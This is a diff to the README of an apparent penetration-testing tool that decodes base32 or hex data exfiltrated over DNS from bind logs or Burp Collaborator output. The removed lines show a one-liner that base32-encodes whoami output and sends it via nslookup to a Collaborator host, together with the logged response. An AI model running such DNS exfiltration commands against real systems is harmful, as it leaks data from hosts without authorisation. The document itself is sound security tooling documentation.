@@ -2,21 +2,7 @@
 
 Parses bind query logs or private Burp Collaborator output to decode base32 or hex-encoded exfiltrated data. 
 
-Burp Collaborator allows prepending hostnames to the provided address. For example: assume this is your collaborator address: `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`
-
-You may prepend names (maximum length of a DNS label is 63 bytes), assuming it uses characters safe in a DNS query (such as base32-encoded data, see below). You may also prepend multiple names, as long as the entire request is 253 bytes or less. This allows exfiltration (including blind exfiltration) of data via DNS. Works best with a private Burp Collaborator server (or any DNS server that logs queries). You may also do this with a public server and a sniffer such as tcpdump (no DNS server required). I plan to add pcap support in the future.
-
-Exfiltrate the base32-encoded output from `whoami` via Burp Collaborator:
-
-Command:
-
-`a=$(whoami|base32|tr -d =);nslookup $a.q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`
-
-Burp Collaborator response:
-
-`O53XOLLEMF2GCCQ.q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`
-
-![Screen Shot 2023-01-10 at 2 59 05 PM](https://user-images.githubusercontent.com/14989334/211650128-5d6a8562-3d64-4ec8-b530-bc47ae5a0db0.png)
+Burp Collaborator allows prepending hostnames to the provided address. You may prepend names (maximum length of a DNS label is 63 bytes), assuming it uses characters safe in a DNS query (such as hex- or base32-encoded data, see below). You may also prepend multiple names, as long as the entire request is 253 bytes or less. This allows exfiltration (including blind exfiltration) of data via DNS. Works best with a private Burp Collaborator server (or any DNS server that logs queries). You may also do this with a public server and a sniffer such as tcpdump (no DNS server required). I plan to add pcap support in the future.
 
 `dns-parse.py` parses native bind query logs, or private Burp Collaborator output, which may be logged via `tee` (requires "logLevel" : "DEBUG" in collaborator.config):
 
